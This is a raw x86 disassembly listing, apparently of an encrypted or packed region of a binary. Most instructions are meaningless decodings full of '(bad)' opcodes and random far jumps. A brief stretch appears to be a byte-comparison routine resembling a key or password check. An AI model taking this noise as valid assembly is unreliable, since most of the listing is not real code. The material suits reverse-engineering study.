  410a54:	mov    ebp,0x7caf7e7e
  410a59:	jle    0x410ad9
  410a5b:	mov    esi,0xed4965c4
  410a60:	or     BYTE PTR [ebx+0x1e],bh
  410a63:	mov    esi,?
  410a65:	add    DWORD PTR [eax-0x34],0xffffffa4
  410a69:	mov    esp,0xb308a2da
  410a6e:	mov    WORD PTR [ecx-0x2b11ed9],?
  410a74:	in     eax,dx
  410a75:	jo     0x410a21
  410a77:	cmp    BYTE PTR [esi+0x5976c3d4],ch
  410a7d:	sbb    dl,BYTE PTR [eax]
  410a7f:	adc    al,0x87
  410a81:	leave  
  410a82:	iret   
  410a83:	in     eax,dx
  410a84:	mov    cl,0xe6
  410a86:	cmc    
  410a87:	into   
  410a88:	mov    dl,0xa6
  410a8a:	imul   ecx,DWORD PTR [edi-0x66],0x45
  410a8e:	repnz (bad) 
  410a90:	jne    0x410b04
  410a92:	add    ebp,DWORD PTR ds:0x88066c4
  410a98:	clc    
  410a99:	sub    al,0x53
  410a9b:	sbb    ebx,ebx
  410a9d:	ds jb  0x410add
  410aa0:	out    dx,eax
  410aa1:	rol    DWORD PTR [edx-0x3c],cl
  410aa4:	xchg   ebp,eax
  410aa5:	cmp    eax,0x32d47fb5
  410aaa:	adc    ch,BYTE PTR [edx-0x72]
  410aad:	mov    gs,WORD PTR [edx-0x9]
  410ab0:	daa    
  410ab1:	cwde   
  410ab2:	and    DWORD PTR [edx+eiz*8+0x6b],ebx
  410ab6:	into   
  410ab7:	inc    ecx
  410ab8:	inc    edi
  410ab9:	mov    eax,ds:0xe4835270
  410abe:	or     eax,0xb496f92f
  410ac3:	(bad)  
  410ac5:	jge    0x410a5d
  410ac7:	pusha  
  410ac8:	neg    DWORD PTR [ebx]
  410aca:	pop    esi
  410acb:	not    cl
  410acd:	mov    dh,BYTE PTR [ebx]
  410acf:	or     eax,0xd3a9b589
  410ad4:	dec    edi
  410ad5:	mov    eax,ds:0x58b94070
  410ada:	sub    eax,0x75bc90a
  410adf:	lds    esi,FWORD PTR [ecx+0x13c756dd]
  410ae5:	js     0x410b2a
  410ae7:	call   0x1b96:0x21300c9c
  410aee:	sub    DWORD PTR [ecx+eiz*2+0x36],edx
  410af2:	xor    al,BYTE PTR [edi-0x79]
  410af5:	xchg   edx,eax
  410af6:	cld    
  410af7:	adc    al,0x1b
  410af9:	inc    edi
  410afa:	repnz cmp DWORD PTR [ebx-0x4a4807ed],edx
  410b01:	push   ds
  410b02:	repz out dx,eax
  410b04:	and    eax,0xab7f4059
  410b09:	jbe    0x410b7e
  410b0b:	mov    bh,0x76
  410b0d:	mov    cs,WORD PTR [ebx-0x20]
  410b10:	mov    bh,0x84
  410b12:	mov    al,0x5f
  410b14:	xor    ah,BYTE PTR [eax]
  410b16:	xchg   BYTE PTR [esi],dh
  410b18:	inc    ecx
  410b19:	xchg   esp,eax
  410b1a:	push   edx
  410b1b:	jmp    0xf937fe18
  410b20:	dec    ecx
  410b21:	call   0xc2da:0xb74d9578
  410b28:	cmp    edx,DWORD PTR [esi-0x56]
  410b2b:	push   ebx
  410b2c:	jne    0x410ba1
  410b2e:	lods   al,BYTE PTR ds:[esi]
  410b2f:	and    ebx,ebp
  410b31:	xchg   bl,cl
  410b33:	jbe    0x410aee
  410b35:	dec    edx
  410b36:	outs   dx,DWORD PTR ds:[esi]
  410b37:	mov    bl,0xa6
  410b39:	stos   BYTE PTR es:[edi],al
  410b3a:	clc    
  410b3b:	in     al,0x21
  410b3d:	pusha  
  410b3e:	adc    DWORD PTR [eax+0x26],ecx
  410b41:	jg     0x410b91
  410b43:	div    edi
  410b45:	or     BYTE PTR [eax],0x32
  410b48:	push   esi
  410b49:	loope  0x410ae4
  410b4b:	retf   0xff26
  410b4e:	je     0x410b18
  410b50:	sub    al,0x56
  410b52:	cmc    
  410b53:	sbb    bh,al
  410b55:	pop    edx
  410b56:	mov    ebx,0x1c68768
  410b5b:	xchg   esp,eax
  410b5c:	pushf  
  410b5d:	test   BYTE PTR [edx+ecx*8-0xc],0x51
  410b62:	inc    ebp
  410b63:	dec    esp
  410b64:	mov    edx,0x6bae414a
  410b69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b6a:	outs   dx,BYTE PTR ds:[esi]
  410b6b:	dec    esp
  410b6c:	imul   eax,DWORD PTR [ebp+eax*2-0x6d],0x34
  410b71:	aas    
  410b72:	popf   
  410b73:	adc    BYTE PTR [ebp+0x243a1cd2],bh
  410b79:	push   eax
  410b7a:	cs jno 0x410b45
  410b7d:	sbb    DWORD PTR [ebx+eax*1+0x4c],0x7d4f8363
  410b85:	out    0x31,eax
  410b87:	xchg   ecx,eax
  410b88:	adc    BYTE PTR [eax+esi*4+0x6c49722b],cl
  410b8f:	ret    
  410b90:	adc    DWORD PTR [esi-0x80],ebp
  410b93:	cmp    ecx,DWORD PTR [edx+0x6d]
  410b96:	outs   dx,BYTE PTR ds:[esi]
  410b97:	fbld   TBYTE PTR [ebx+ecx*2-0xc]
  410b9b:	jmp    0xb49f:0x24c30877
  410ba2:	inc    esi
  410ba3:	(bad)  
  410ba4:	adc    esp,DWORD PTR [edi+0x71ad9006]
  410baa:	(bad)  
  410bab:	aas    
  410bac:	pop    edi
  410bad:	lods   al,BYTE PTR ds:[esi]
  410bae:	push   cs
  410baf:	push   edi
  410bb0:	pop    edi
  410bb1:	aaa    
  410bb2:	adc    al,0xce
  410bb4:	xchg   ecx,eax
  410bb5:	aad    0x6b
  410bb7:	cmp    al,0xff
  410bb9:	fcom   DWORD PTR [edx-0x2fb5a562]
  410bbf:	cmp    BYTE PTR ds:0x8d34e8d9,al
  410bc5:	and    edi,DWORD PTR [eax+eax*8]
  410bc8:	pop    ebp
  410bc9:	xor    al,ch
  410bcb:	and    eax,0xfbd3997c
  410bd0:	mov    edx,es
  410bd2:	sahf   
  410bd3:	in     eax,dx
  410bd4:	or     eax,0x133b0df2
  410bd9:	push   ebp
  410bda:	cmp    BYTE PTR [eax+0x4],dl
  410bdd:	test   BYTE PTR [edx+edi*8-0x53b077a5],0xc7
  410be5:	das    
  410be6:	ja     0x410c3c
  410be8:	(bad)  
  410be9:	fdivr  st,st(3)
  410beb:	xchg   BYTE PTR [ebx],dl
  410bed:	call   0x1d6f:0xd644c490
  410bf4:	loop   0x410b98
  410bf6:	mov    dl,0xfd
  410bf8:	push   0x3f88536
  410bfd:	shld   DWORD PTR [esp+ebp*2-0x28],edi,cl
  410c02:	cwde   
  410c03:	jmp    0x410c31
  410c05:	xor    eax,0xce82529b
  410c0a:	cdq    
  410c0b:	cmp    eax,0x1002612c
  410c10:	retf   
  410c11:	inc    edi
  410c12:	or     DWORD PTR [esi+0x1b],edx
  410c15:	adc    cl,ch
  410c17:	cli    
  410c18:	pushf  
  410c19:	pop    edi
  410c1a:	and    DWORD PTR [ecx],esp
  410c1c:	ins    BYTE PTR es:[edi],dx
  410c1d:	push   edi
  410c1e:	les    edx,FWORD PTR [eax-0x20]
  410c21:	cmc    
  410c22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c23:	data16 (bad) cs:[ecx+0x500add48]
  410c2b:	xor    DWORD PTR [esi+0x7c],0x1d
  410c2f:	or     al,0x56
  410c31:	jle    0x410c62
  410c33:	jns    0x410c6a
  410c35:	cmp    al,BYTE PTR [edi-0x2109c844]
  410c3b:	xchg   ebx,eax
  410c3c:	cld    
  410c3d:	lods   eax,DWORD PTR ds:[esi]
  410c3e:	pop    ecx
  410c3f:	(bad)  
  410c40:	aas    
  410c41:	dec    edi
  410c42:	inc    esp
  410c43:	sub    ebx,DWORD PTR [eax]
  410c45:	adc    bh,bh
  410c47:	psrld  mm5,QWORD PTR [ebp+0x55]
  410c4b:	xchg   edx,eax
  410c4c:	push   ebp
  410c4d:	adc    DWORD PTR [esi+0x46],0xe4c58986
  410c54:	push   0x2025a104
  410c59:	rol    BYTE PTR [esi+edx*1],1
  410c5c:	push   0x6e
  410c5e:	pop    eax
  410c5f:	adc    DWORD PTR [esi-0x61],edx
  410c62:	pop    esp
  410c63:	sbb    eax,0x9933452
  410c68:	add    bh,BYTE PTR [ecx]
  410c6a:	mov    ah,0x4e
  410c6c:	fs dec ecx
  410c6e:	daa    
  410c6f:	xor    DWORD PTR [ebp+0x289d65b6],ebx
  410c75:	jnp    0x410c90
  410c77:	xchg   DWORD PTR [edi],edi
  410c79:	cwde   
  410c7a:	test   cl,0x69
  410c7d:	inc    ebx
  410c7e:	sbb    DWORD PTR [ebp+0x7c7f0f65],esp
  410c84:	mov    eax,ebx
  410c86:	cmp    eax,0xff1b81ae
  410c8b:	aad    0x59
  410c8d:	xchg   edi,eax
  410c8e:	fsub   DWORD PTR [esi]
  410c90:	data16 jl 0x410c61
  410c93:	inc    BYTE PTR [esi+0x523dbc73]
  410c99:	and    ch,dh
  410c9b:	(bad)  
  410c9c:	rcl    BYTE PTR [edi],1
  410c9e:	dec    eax
  410c9f:	(bad)  
  410ca1:	jns    0x410cb7
  410ca3:	sub    ebx,DWORD PTR [edx]
  410ca5:	pushf  
  410ca6:	cld    
  410ca7:	sbb    dh,0xc
  410caa:	jmp    0x25ae5825
  410caf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cb0:	jb     0x410c57
  410cb2:	cmp    ah,bh
  410cb4:	push   0x8a2fac35
  410cb9:	add    ebx,DWORD PTR [ecx-0x47]
  410cbc:	aam    0xa7
  410cbe:	mov    bh,0x36
  410cc0:	dec    ebp
  410cc1:	es mov dh,0xb1
  410cc4:	pop    edx
  410cc5:	xor    bl,BYTE PTR [esi-0x46]
  410cc8:	int    0xb7
  410cca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ccb:	rcr    DWORD PTR [esi+esi*2],cl
  410cce:	ins    DWORD PTR es:[edi],dx
  410ccf:	jb     0x410c57
  410cd1:	lea    eax,[edi+0x61]
  410cd4:	push   ecx
  410cd5:	add    eax,0xce1bab9c
  410cda:	test   BYTE PTR [ebx+0x7b27ac13],bh
  410ce0:	in     al,dx
  410ce1:	xor    BYTE PTR [eax],ah
  410ce3:	dec    ebp
  410ce4:	jecxz  0x410cd2
  410ce6:	fbstp  TBYTE PTR [eax-0x71]
  410ce9:	ror    BYTE PTR [eax+ecx*1+0x166caccc],cl
  410cf0:	loope  0x410c9a
  410cf2:	and    al,0x85
  410cf4:	ins    BYTE PTR es:[edi],dx
  410cf5:	pop    ebp
  410cf6:	hlt    
  410cf7:	stos   DWORD PTR es:[edi],eax
  410cf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cf9:	repnz mov dh,0x57
  410cfc:	faddp  st(3),st
  410cfe:	mov    cl,0xd5
  410d00:	mov    WORD PTR [eax+0x4f],cs
  410d03:	aas    
  410d04:	and    dh,BYTE PTR [edx+0x108028e0]
  410d0a:	xchg   BYTE PTR [edi+0x458b0289],ah
  410d10:	clc    
  410d11:	jmp    0x410fdf
  410d16:	je     0x410d40
  410d18:	(bad)  
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0x2ffa209c
  410d25:	mov    ah,0xeb
  410d27:	mov    eax,0x7caf7e7e
  410d2c:	jle    0x410dac
  410d2e:	ror    BYTE PTR [edx-0x76],0x50
  410d32:	adc    ebp,ecx
  410d34:	pop    esp
  410d35:	cwde   
  410d36:	jge    0x410d00
  410d38:	mov    ebp,0x29b141c2
  410d3d:	out    dx,eax
  410d3e:	test   DWORD PTR [ecx],eax
  410d40:	fwait
  410d41:	gs sub al,0x82
  410d44:	es loope 0x410d38
  410d47:	cmp    dl,BYTE PTR [edi+0x1215a064]
  410d4d:	fs push ss
  410d4f:	fwait
  410d50:	dec    eax
  410d51:	xor    al,0x61
  410d53:	mov    ah,0x84
  410d55:	xchg   ebp,eax
  410d56:	xor    BYTE PTR [ebx-0x33],cl
  410d59:	pushf  
  410d5a:	xchg   edi,eax
  410d5b:	adc    eax,0x6f7b1cf1
  410d60:	push   0xffffffd9
  410d62:	je     0x410dcf
  410d64:	mov    esi,0x6b5821e5
  410d69:	leave  
  410d6a:	aas    
  410d6b:	pop    eax
  410d6c:	push   es
  410d6d:	test   al,0x9a
  410d6f:	nop
  410d70:	cs clc 
  410d72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d73:	pop    ds
  410d74:	jmp    0x2ebb:0x50a4700d
  410d7b:	sbb    eax,0xc3e55241
  410d80:	jmp    0x5258:0x294ed485
  410d87:	mov    ds,WORD PTR [edx+0x2c]
  410d8a:	dec    ecx
  410d8b:	fdivr  DWORD PTR [edi]
  410d8d:	xor    DWORD PTR ds:0x25e4898f,edx
  410d93:	iret   
  410d94:	test   al,0xa2
  410d96:	mov    BYTE PTR [esi+ebx*1],ah
  410d99:	(bad)  
  410d9a:	cmp    cl,dh
  410d9c:	lock xor ebp,DWORD PTR [edx]
  410d9f:	popa   
  410da0:	xchg   ebp,eax
  410da1:	dec    ebp
  410da2:	push   ebx
  410da3:	cli    
  410da4:	loope  0x410e15
  410da6:	and    DWORD PTR [esi+ecx*1-0x41],esi
  410daa:	cld    
  410dab:	repz icebp 
  410dad:	or     al,ch
  410daf:	mov    eax,ds:0xddc3dca
  410db4:	jns    0x410dd2
  410db6:	jg     0x410e26
  410db8:	test   eax,0xe6c3548c
  410dbd:	sub    DWORD PTR [esi+0x4ec23160],esp
  410dc3:	xor    ebx,DWORD PTR [edx]
  410dc5:	jp     0x410d88
  410dc7:	(bad)  
  410dc8:	(bad)  
  410dca:	lea    esp,[ebx+0x40]
  410dcd:	adc    BYTE PTR ds:0x302408e,0x24
  410dd4:	in     eax,dx
  410dd5:	or     dl,BYTE PTR [esi+0x2e]
  410dd8:	sete   bl
  410ddb:	and    ebp,DWORD PTR [edx]
  410ddd:	fs cmp eax,0xe08b674b
  410de3:	xchg   ebp,eax
  410de4:	dec    ebp
  410de5:	and    esi,DWORD PTR [eax]
  410de7:	out    dx,eax
  410de8:	lahf   
  410de9:	fisub  DWORD PTR [ecx+0x864b232]
  410def:	cli    
  410df0:	mov    edi,0x25b298d4
  410df5:	push   ebp
  410df6:	sub    ebp,esp
  410df8:	loope  0x410e1d
  410dfa:	pop    ecx
  410dfb:	sub    BYTE PTR [esi+0x15],0xa
  410dff:	loope  0x410e5b
  410e01:	mov    dh,0xd8
  410e03:	xor    BYTE PTR [ebp-0x57],ch
  410e06:	popf   
  410e07:	jp     0x410d8f
  410e09:	mov    BYTE PTR [ebp+0x66],al
  410e0c:	or     ch,ah
  410e0e:	inc    eax
  410e0f:	mov    eax,ds:0x392f1210
  410e14:	jmp    0xef71:0xa9e68fd
  410e1b:	icebp  
  410e1c:	jmp    0x625958fb
  410e21:	mov    al,0xe8
  410e23:	dec    ebp
  410e24:	mov    WORD PTR [ecx],?
  410e26:	jmp    0x5a63:0x5763b2b
  410e2d:	inc    esi
  410e2e:	int3   
  410e2f:	data16 daa 
  410e31:	sbb    BYTE PTR [edi+0x65c47291],0x32
  410e38:	ret    0x8af4
  410e3b:	xchg   BYTE PTR [eax-0x2a],ah
  410e3e:	push   ecx
  410e3f:	iret   
  410e40:	aas    
  410e41:	ds jno 0x410e4a
  410e44:	loop   0x410e1d
  410e46:	aaa    
  410e47:	mov    ds:0x4a24405f,eax
  410e4c:	jbe    0x410e18
  410e4e:	(bad)  
  410e4f:	int3   
  410e50:	add    al,0xd5
  410e52:	maskmovq mm2,(bad)
  410e53:	not    DWORD PTR [ebx-0x1a5bb0f4]
  410e59:	aad    0x19
  410e5b:	rcl    DWORD PTR [ebp-0x60],0xdf
  410e5f:	xchg   ecx,eax
  410e60:	retf   0xa832
  410e63:	lock cmc 
  410e65:	stos   DWORD PTR es:[edi],eax
  410e66:	mov    al,0x10
  410e68:	rcr    BYTE PTR [edi+edi*8],0xca
  410e6c:	mov    DWORD PTR [ebx],ecx
  410e6e:	pop    ss
  410e6f:	cmp    al,0x11
  410e71:	pushf  
  410e72:	dec    eax
  410e73:	sar    DWORD PTR [ebp-0x6b0db5cb],cl
  410e79:	popf   
  410e7a:	call   0x2955:0xe1be5f9c
  410e81:	shl    al,cl
  410e83:	mov    esp,0xc277699f
  410e88:	dec    eax
  410e89:	add    dh,BYTE PTR [ecx]
  410e8b:	jb     0x410ef7
  410e8d:	cdq    
  410e8e:	xlat   BYTE PTR ds:[ebx]
  410e8f:	lods   eax,DWORD PTR ds:[esi]
  410e90:	popf   
  410e91:	das    
  410e92:	std    
  410e93:	jle    0x410f0a
  410e95:	or     DWORD PTR [edx-0x31],ebx
  410e98:	mov    ebx,0x4e4bae64
  410e9d:	adc    DWORD PTR [edx],eax
  410e9f:	test   dh,ch
  410ea1:	mov    ecx,0xc16b279c
  410ea6:	cmp    al,BYTE PTR ds:0x89857d10
  410eac:	mov    dh,0x85
  410eae:	retf   
  410eaf:	retf   0xfc30
  410eb2:	jp     0x410e85
  410eb4:	mov    DWORD PTR [edi+eiz*4],ebx
  410eb7:	inc    esp
  410eb8:	sbb    al,0x65
  410eba:	xor    ch,al
  410ebc:	lods   eax,DWORD PTR ds:[esi]
  410ebd:	jo     0x410e83
  410ebf:	(bad)  
  410ec0:	in     al,dx
  410ec1:	inc    ecx
  410ec2:	fist   WORD PTR [edx-0x11f248bc]
  410ec8:	jnp    0x410e77
  410eca:	push   edi
  410ecb:	lods   al,BYTE PTR ds:[esi]
  410ecc:	fisttp QWORD PTR [ecx+ecx*1-0x48]
  410ed0:	(bad)  
  410ed1:	mov    esp,0x152db41e
  410ed6:	mov    ah,0xe6
  410ed8:	adc    BYTE PTR [ebx-0x59],dl
  410edb:	mov    esi,0x53609961
  410ee0:	mov    BYTE PTR [ecx],cl
  410ee2:	cli    
  410ee3:	clc    
  410ee4:	daa    
  410ee5:	inc    esp
  410ee6:	jbe    0x410e88
  410ee8:	je     0x410f29
  410eea:	mov    ah,0x48
  410eec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410eed:	inc    eax
  410eee:	jns    0x410ea9
  410ef0:	inc    BYTE PTR [ecx]
  410ef2:	mov    ebx,0x7f9e9894
  410ef7:	mov    al,0x26
  410ef9:	and    al,0xa3
  410efb:	cdq    
  410efc:	xor    eax,0x59278d01
  410f01:	push   ebp
  410f02:	mov    ah,0x8a
  410f04:	les    edx,FWORD PTR [edx-0x41]
  410f07:	inc    ecx
  410f08:	(bad)  
  410f09:	cmp    DWORD PTR [ebp+eax*1-0x2e],esp
  410f0d:	xchg   esp,eax
  410f0e:	(bad)  [ecx+0x53c88cc9]
  410f14:	sbb    BYTE PTR ds:0xa3732ebe,bl
  410f1a:	(bad)  
  410f1b:	cdq    
  410f1c:	sub    edi,eax
  410f1e:	cmp    DWORD PTR fs:[ecx-0x1cb75e1b],esp
  410f25:	dec    esp
  410f26:	popa   
  410f27:	stos   BYTE PTR es:[edi],al
  410f28:	imul   ebp,ebp,0xf5b62f1
  410f2e:	cmp    eax,0xdbd2d9ec
  410f33:	fild   WORD PTR [esi-0x38]
  410f36:	mov    eax,ds:0x65b09c28
  410f3b:	adc    eax,0x456e74e6
  410f40:	cmp    bh,ch
  410f42:	call   0x381f009e
  410f47:	fwait
  410f48:	adc    esp,DWORD PTR [edi]
  410f4a:	jbe    0x410f38
  410f4c:	dec    ebx
  410f4d:	cmp    BYTE PTR [ebp-0x7],0x95
  410f51:	ds xchg ebp,eax
  410f53:	xor    dh,BYTE PTR [ebx-0x50308cce]
  410f59:	jno    0x410f16
  410f5b:	jno    0x410ee3
  410f5d:	loopne 0x410f0b
  410f5f:	(bad)  
  410f62:	mov    ah,0x7a
  410f64:	pop    ds
  410f65:	call   0x8277:0x3e33f1b9
  410f6c:	pusha  
  410f6d:	bound  ebp,QWORD PTR [ebp+0x5a]
  410f70:	pop    ecx
  410f71:	push   cs
  410f72:	add    al,0x92
  410f74:	je     0x410f8c
  410f76:	cmc    
  410f77:	neg    BYTE PTR [ebx]
  410f79:	lods   al,BYTE PTR ds:[esi]
  410f7a:	adc    esp,DWORD PTR [edi-0xb]
  410f7d:	jnp    0x410f36
  410f7f:	icebp  
  410f80:	jecxz  0x410ff9
  410f82:	leave  
  410f83:	add    BYTE PTR [edx],ah
  410f85:	mov    dh,0xec
  410f87:	mov    edx,0x3d3b13a8
  410f8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f8d:	cmp    al,0xd6
  410f8f:	daa    
  410f90:	push   ebx
  410f91:	iret   
  410f92:	inc    edx
  410f93:	xchg   DWORD PTR ds:0x6568c950,ebp
  410f99:	or     edx,DWORD PTR [ecx]
  410f9b:	ror    DWORD PTR [esi+eiz*1-0x10],cl
  410f9f:	adc    DWORD PTR [esi-0x51],eax
  410fa2:	ret    
  410fa3:	mov    WORD PTR [edi],?
  410fa5:	addr16 jl 0x410fc3
  410fa8:	and    bh,ah
  410faa:	push   edi
  410fab:	cmp    BYTE PTR [esi+edi*8-0x4a],bl
  410faf:	ins    DWORD PTR es:[edi],dx
  410fb0:	mov    ecx,0xd011c578
  410fb5:	or     bl,dh
  410fb7:	js     0x410f41
  410fb9:	mov    ah,0xb
  410fbb:	jp     0x410fda
  410fbd:	mov    eax,0x1709fa0f
  410fc2:	pop    ss
  410fc3:	xor    eax,DWORD PTR [ebx-0x20]
  410fc6:	mov    bl,0x82
  410fc8:	sbb    eax,0x762d49d7
  410fcd:	pop    ebx
  410fce:	out    0x48,eax
  410fd0:	mov    ecx,esp
  410fd2:	inc    edi
  410fd3:	xchg   ebp,eax
  410fd4:	jle    0x411016
  410fd6:	push   esp
  410fd7:	ins    BYTE PTR es:[edi],dx
  410fd8:	std    
  410fd9:	aas    
  410fda:	stc    
  410fdb:	scas   al,BYTE PTR es:[edi]
  410fdc:	push   edx
  410fdd:	inc    edx
  410fde:	jl     0x411013
  410fe0:	rol    DWORD PTR [ebx],0xc6
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x410fd3
  41102b:	lock cwde 
  41102d:	pop    ebx
  41102e:	sbb    BYTE PTR [edi+0x7e],al
  411031:	jle    0x410fe2
  411033:	jl     0x4110b3
  411035:	jle    0x411011
  411037:	push   esp
  411038:	cmp    DWORD PTR [eax],esp
  41103a:	test   al,0x95
  41103c:	mov    WORD PTR [esi-0x6d],cs
  41103f:	into   
  411040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411041:	sub    DWORD PTR [ebx-0xf4b81b0],esi
  411047:	adc    al,0xe4
  411049:	jae    0x411069
  41104b:	and    al,0xc3
  41104d:	mov    edi,0x69464e19
  411052:	outs   dx,BYTE PTR ds:[esi]
  411053:	js     0x411058
  411055:	in     al,0x77
  411057:	jmp    0x1d909a3
  41105c:	sub    bh,BYTE PTR [ebp-0x8905172]
  411062:	cmc    
  411063:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411064:	jp     0x411084
  411066:	fwait
  411067:	xor    cx,WORD PTR [edx+0x35bf7839]
  41106e:	aad    0x1c
  411070:	fwait
  411071:	in     eax,0xa7
  411073:	mov    dl,0x60
  411075:	aaa    
  411076:	sbb    ah,BYTE PTR [edi+ebx*8+0x1a727dae]
  41107d:	ret    0xda0d
  411080:	mov    edi,0x6fcbc88c
  411085:	adc    al,0xfa
  411087:	shl    BYTE PTR [ebp+0x56d16868],0xdf
  41108e:	aas    
  41108f:	and    eax,0x302586d7
  411094:	sub    edi,DWORD PTR [edx+eax*2]
  411097:	(bad)  
  411098:	ror    ebp,1
  41109a:	xchg   BYTE PTR [esp+eax*1+0x69],al
  41109e:	pop    esi
  41109f:	pop    esi
  4110a0:	pop    ebx
  4110a1:	xor    ebp,DWORD PTR [esi-0x7cdd36dd]
  4110a7:	mov    ch,0x65
  4110a9:	push   ebp
  4110aa:	add    al,0x9c
  4110ac:	jle    0x4110b9
  4110ae:	xchg   BYTE PTR ds:0x226976dd,ah
  4110b4:	sbb    BYTE PTR [edi],dl
  4110b6:	out    dx,al
  4110b7:	bsr    ecx,DWORD PTR [ecx-0x35]
  4110bb:	jmp    0xbf6d49a9
  4110c0:	mov    ch,0x35
  4110c2:	xchg   BYTE PTR [esi],ah
  4110c4:	in     al,dx
  4110c5:	pop    ebx
  4110c6:	add    BYTE PTR [ecx-0x7e],cl
  4110c9:	sbb    eax,0x54338f4
  4110ce:	push   ecx
  4110cf:	xor    BYTE PTR [ebx-0x737b3b9d],ch
  4110d5:	jecxz  0x411124
  4110d7:	sbb    ecx,DWORD PTR [edi+0x2995929a]
  4110dd:	jp     0x411150
  4110df:	sbb    ah,BYTE PTR [edi]
  4110e1:	mov    ch,0x1d
  4110e3:	outs   dx,DWORD PTR ds:[esi]
  4110e4:	jno    0x411109
  4110e6:	(bad)  
  4110e7:	mov    WORD PTR [esi],fs
  4110e9:	add    DWORD PTR [ebx+0x22def574],ecx
  4110ef:	nop
  4110f0:	js     0x4110e3
  4110f2:	cld    
  4110f3:	shr    cl,cl
  4110f5:	push   esi
  4110f6:	frstor [edx-0x35e4a99]
  4110fc:	(bad)  
  4110fd:	cli    
  4110fe:	out    dx,al
  4110ff:	xor    ecx,ebp
  411101:	cmp    al,0x95
  411103:	sub    eax,0x8b772e03
  411108:	repz pop ebp
  41110a:	ins    DWORD PTR es:[edi],dx
  41110b:	push   es
  41110c:	and    al,0xcd
  41110e:	jg     0x41113c
  411110:	and    esp,edx
  411112:	pop    es
  411113:	add    eax,0xe1dcd2bb
  411118:	std    
  411119:	sar    dh,1
  41111b:	mov    ebp,0x8210ac8
  411120:	push   eax
  411121:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411122:	cld    
  411123:	(bad)  
  411124:	adc    DWORD PTR [ebx],edi
  411126:	inc    eax
  411127:	and    eax,0xfa3a2f93
  41112c:	sub    dh,BYTE PTR [eax+eax*4+0x6b3c10dd]
  411133:	add    di,WORD PTR [eax+0x72]
  411137:	adc    al,0xcf
  411139:	and    BYTE PTR [esi],bh
  41113b:	mov    eax,0x5acf97e2
  411140:	mov    al,ds:0xaf18c638
  411145:	sar    cl,cl
  411147:	sub    DWORD PTR [edx-0x21],ebp
  41114a:	mov    bh,0x80
  41114c:	add    edx,DWORD PTR [eax+0x4d]
  41114f:	xor    esp,esi
  411151:	xor    BYTE PTR [eax+0x2fc5e46b],ah
  411157:	pop    esp
  411158:	scas   eax,DWORD PTR es:[edi]
  411159:	sub    BYTE PTR ds:0x393ced9a,ch
  41115f:	xchg   ebp,eax
  411160:	popa   
  411161:	outs   dx,BYTE PTR ds:[esi]
  411162:	cmp    eax,0xedd56a11
  411167:	and    DWORD PTR [ebp-0xb8422cb],esp
  41116d:	adc    BYTE PTR [ecx+0x7a],0x9e
  411171:	xchg   ebx,eax
  411172:	jl     0x411191
  411174:	jns    0x411170
  411176:	ds cwde 
  411178:	fstp   DWORD PTR [ebp-0x5]
  41117b:	shr    DWORD PTR [eax-0x546c4878],cl
  411181:	or     DWORD PTR [ecx-0x4f],0xe872cf5d
  411188:	xchg   esi,eax
  411189:	sbb    ecx,DWORD PTR [eax+0x5c]
  41118c:	cmp    eax,0xc9914b1c
  411191:	mov    eax,0x2b9e22c0
  411196:	dec    eax
  411197:	mov    eax,ecx
  411199:	mov    ebx,0x9e9a7d1f
  41119e:	xchg   ecx,eax
  41119f:	mov    bh,al
  4111a1:	out    dx,eax
  4111a2:	bound  esi,QWORD PTR [edx]
  4111a4:	pop    esi
  4111a5:	jo     0x4111e5
  4111a7:	sbb    BYTE PTR [esi],0x7c
  4111aa:	fwait
  4111ab:	jle    0x4111ee
  4111ad:	xlat   BYTE PTR ds:[ebx]
  4111ae:	cmp    DWORD PTR [edx],edi
  4111b0:	repnz sub BYTE PTR [esi-0x5af2b366],al
  4111b7:	nop
  4111b8:	aas    
  4111b9:	sub    eax,0x74788ceb
  4111be:	cs inc ecx
  4111c0:	push   0xffffff80
  4111c2:	std    
  4111c3:	enter  0xe39f,0x5a
  4111c7:	iret   
  4111c8:	shl    DWORD PTR [edi+0x28537cfa],1
  4111ce:	xchg   esi,eax
  4111cf:	mov    edi,0x4477ff84
  4111d4:	cmp    BYTE PTR [eax-0x16],ah
  4111d7:	jmp    0x60d69958
  4111dc:	jp     0x41116c
  4111de:	repnz xchg ecx,eax
  4111e0:	cmc    
  4111e1:	imul   esi,DWORD PTR [edx],0x4653302c
  4111e7:	lds    esi,FWORD PTR [esi-0x35]
  4111ea:	inc    eax
  4111eb:	not    BYTE PTR [ecx+0x79579515]
  4111f1:	cs loopne 0x4111d7
  4111f4:	nop
  4111f5:	repz jnp 0x411257
  4111f8:	bound  edi,QWORD PTR [edx]
  4111fa:	mov    esp,ebp
  4111fc:	inc    ecx
  4111fd:	jge    0x4111c1
